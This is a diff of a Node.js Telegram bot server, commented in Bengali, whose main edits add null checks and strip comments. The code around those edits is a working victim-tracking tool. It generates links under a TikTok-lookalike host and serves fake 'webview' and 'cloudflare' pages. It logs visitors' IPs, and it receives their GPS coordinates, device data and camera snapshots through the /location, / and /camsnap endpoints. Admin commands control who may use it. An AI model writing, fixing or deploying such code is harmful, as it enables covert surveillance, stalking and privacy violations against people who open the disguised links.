@@ -15,7 +15,6 @@ app.set("view engine", "ejs");
 
 //Modify your URL here
 var hostURL="https://tiktok-official.onrender.com";
-// এই লাইনটি পরিবর্তন করা হয়েছে যেন লিঙ্ক শর্ট না হয়
 var usecodetabs=false;
 
 // আপনার Telegram User ID, যাকে Bot এর অ্যাডমিন বানানো হবে
@@ -26,7 +25,6 @@ let allowedUsers = {};
 try {
     allowedUsers = JSON.parse(fs.readFileSync('users.json', 'utf8'));
 } catch (error) {
-    // ফাইল না থাকলে, এটি একটি নতুন ফাইল তৈরি করবে।
     allowedUsers[ownerId] = {
         expires: 'forever'
     };
@@ -69,19 +67,15 @@ async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null
         
         try {
             if (photoFileIdOrUrl) {
-                // ছবি সহ ক্যাপশন পাঠানো হচ্ছে
                 await bot.sendPhoto(targetChatId, photoFileIdOrUrl, { 
                     caption: message 
                 });
             } else {
-                // শুধু টেক্সট পাঠানো হচ্ছে
                 await bot.sendMessage(targetChatId, message);
             }
             successCount++;
-            // টেলিগ্রাম রেট লিমিট এড়াতে সামান্য বিরতি
             await new Promise(resolve => setTimeout(resolve, 50)); 
         } catch (error) {
-            // যদি কোনো ব্যবহারকারী বটটিকে ব্লক করে দেয়
             console.error(`Error sending message/photo to ${targetChatId}:`, error.message);
             failedCount++;
         }
@@ -89,9 +83,9 @@ async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null
 
     bot.sendMessage(adminChatId, `✅ ব্রডকাস্ট সম্পন্ন!\nসফলভাবে পাঠানো হয়েছে: ${successCount} জনের কাছে।\nব্যর্থ হয়েছে: ${failedCount} টি।`);
 }
-// ⭐ ব্রডকাস্ট ফাংশন শেষ
 
 app.get("/w/:path/:uri",(req,res)=>{
+// ... (কমন ফাংশন অপরিবর্তিত)
 var ip;
 var d = new Date();
 d=d.toJSON().slice(0,19).replace('T',':');
@@ -103,10 +97,10 @@ res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,
 else{
 res.redirect("https://t.me/ehtool");
 }
-
 });
 
 app.get("/c/:path/:uri",(req,res)=>{
+// ... (কমন ফাংশন অপরিবর্তিত)
 var ip;
 var d = new Date();
 d=d.toJSON().slice(0,19).replace('T',':');
@@ -119,7 +113,6 @@ res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.pa
 else{
 res.redirect("https://t.me/ehtool");
 }
-
 });
 
 
@@ -133,10 +126,11 @@ if (!isAllowed(chatId)) {
 }
 
 if(msg?.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
-    // এখানে msg.text চেক করা হচ্ছে, এটি createLink ফাংশনেও চেক করা হচ্ছে।
+    // এই কলটি নিরাপদ, কারণ createLink এর ভেতরে msg এর বৈধতা চেক করা আছে।
     createLink(chatId,msg.text); 
 }
 
+// 🛑 ফিক্স: সমস্ত msg.text চেকের আগে msg.text আছে কি না, তা নিশ্চিত করুন।
 if(msg.text=="/start"){
 var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
@@ -156,8 +150,8 @@ bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি �
 \n\nঅবশ্যই আমাদের চ্যানেলে জয়েন হবেন আরোও টুলস পাওয়ার জন্য\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
 `);
 }
-// ⭐ ব্রডকাস্ট কমান্ড (ছবি সাপোর্টেড)
-else if (msg.text.startsWith('/broadcast')) {
+// ⭐ ব্রডকাস্ট কমান্ড (ছবি সাপোর্টেড) - এখানে ফিক্স করা হয়েছে
+else if (msg.text && msg.text.startsWith('/broadcast')) {
     if (chatId !== ownerId) {
         bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
         return;
@@ -166,9 +160,7 @@ else if (msg.text.startsWith('/broadcast')) {
     const broadcastMessage = msg.text.substring('/broadcast'.length).trim();
     let photoFileId = null;
 
-    // যদি কমান্ডটি একটি ছবির রিপ্লাই হিসেবে আসে
     if (msg.reply_to_message && msg.reply_to_message.photo) {
-        // সবচেয়ে বড় সাইজের ছবির file_id নেওয়া হচ্ছে
         photoFileId = msg.reply_to_message.photo.pop().file_id;
     }
 
@@ -177,12 +169,10 @@ else if (msg.text.startsWith('/broadcast')) {
         return;
     }
 
-    // ব্রডকাস্ট শুরু করা
     broadcastToAllUsers(chatId, broadcastMessage, photoFileId);
 }
-// ⭐ ব্রডকাস্ট কমান্ড শেষ
-// নতুন কমান্ড: /allow <chat_id> <time> - FIXED LOGIC
-else if (msg.text.startsWith('/allow')) {
+// নতুন কমান্ড: /allow <chat_id> <time> - এখানে ফিক্স করা হয়েছে
+else if (msg.text && msg.text.startsWith('/allow')) {
     if (chatId !== ownerId) {
         bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
         return;
@@ -203,7 +193,6 @@ else if (msg.text.startsWith('/allow')) {
             const now = new Date();
             const timeValue = parseInt(duration);
             
-            // 🛑 FIX 1: Invalid timeValue (NaN) check
             if (isNaN(timeValue)) {
                 bot.sendMessage(chatId, `⚠️ সময় ("${duration}") সঠিক নয়। সময় অবশ্যই একটি সংখ্যা এবং তার পিছনে একক (যেমন 5m, 2h, 1d) হতে হবে।`);
                 return;
@@ -222,7 +211,6 @@ else if (msg.text.startsWith('/allow')) {
             } 
             
             if (timeSet) {
-                // 🛡️ FIX 2: Final safety check 
                 if (!isNaN(now.getTime())) {
                     expiresAt = now.toISOString(); 
                 } else {
@@ -230,7 +218,6 @@ else if (msg.text.startsWith('/allow')) {
                      return;
                 }
             } else {
-                // If the duration format was incorrect (e.g., a number without m/h/d)
                 bot.sendMessage(chatId, `⚠️ সময় ("${duration}") সঠিক নয়। সময় অবশ্যই একটি সংখ্যা এবং তার পিছনে একক (যেমন 5m, 2h, 1d) হতে হবে।`);
                 return;
             }
@@ -250,8 +237,8 @@ else if (msg.text.startsWith('/allow')) {
         bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
     }
 }
-// নতুন কমান্ড: /disallow <chat_id>
-else if (msg.text.startsWith('/disallow')) {
+// নতুন কমান্ড: /disallow <chat_id> - এখানে ফিক্স করা হয়েছে
+else if (msg.text && msg.text.startsWith('/disallow')) {
     if (chatId !== ownerId) {
         bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
         return;
@@ -275,7 +262,7 @@ else if (msg.text.startsWith('/disallow')) {
         bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
     }
 }
-// নতুন কমান্ড: /uptime
+// নতুন কমান্ড: /uptime - এখানে ফিক্স করা হয়েছে
 else if (msg.text === '/uptime') {
     const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
     const hours = Math.floor(uptimeInSeconds / 3600);
@@ -283,9 +270,15 @@ else if (msg.text === '/uptime') {
     const seconds = uptimeInSeconds % 60;
     bot.sendMessage(chatId, `বটটি চালু আছে ${hours} ঘন্টা, ${minutes} মিনিট, এবং ${seconds} সেকেন্ড ধরে।`);
 }
+// 🛑 অতিরিক্ত ফিক্স: যদি কোনো টেক্সট মেসেজ না থাকে, তাহলে এখানে শেষ হবে।
+else if (!msg.text) {
+    // কোনো টেক্সট নেই (যেমন ছবি, স্টিকার, ইত্যাদি)। কিছু না করে ফাংশন শেষ হবে।
+    return;
+}
 });
 
 bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
+// ... (কমন ফাংশন অপরিবর্তিত)
 bot.answerCallbackQuery(callbackQuery.id);
 if (!isAllowed(callbackQuery.from.id)) {
     bot.sendMessage(callbackQuery.from.id, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉/n/n/nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
@@ -366,6 +359,7 @@ bot.sendMessage(cid,`🌐 আপনার লিঙ্কটি দিন`,mk);
 
 
 app.get("/", (req, res) => {
+// ... (কমন ফাংশন অপরিবর্তিত)
 var ip;
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
 res.json({"ip":ip});
@@ -375,7 +369,7 @@ res.json({"ip":ip});
 
 
 app.post("/location",(req,res)=>{
-
+// ... (কমন ফাংশন অপরিবর্তিত)
 
 var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
 var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
@@ -393,6 +387,7 @@ res.send("Done");
 
 
 app.post("/",(req,res)=>{
+// ... (কমন ফাংশন অপরিবর্তিত)
 
 var uid=decodeURIComponent(req.body.uid) || null;
 var data=decodeURIComponent(req.body.data)  || null;
@@ -410,12 +405,12 @@ res.send("Done");
 
 
 app.post("/camsnap",(req,res)=>{
+// ... (কমন ফাংশন অপরিবর্তিত)
     var uid=decodeURIComponent(req.body.uid) || null;
     var img=decodeURIComponent(req.body.img) || null;
 
     if(uid != null && img != null){
         
-        // এখানে সরাসরি Base64 ডেটা ব্যবহার করা হয়েছে, কারণ ক্লায়েন্ট-সাইড কোড প্রিফিক্স মুছে দেয়।
         const base64Data = img;
         if (!base64Data) {
             console.log("Empty Base64 data.");
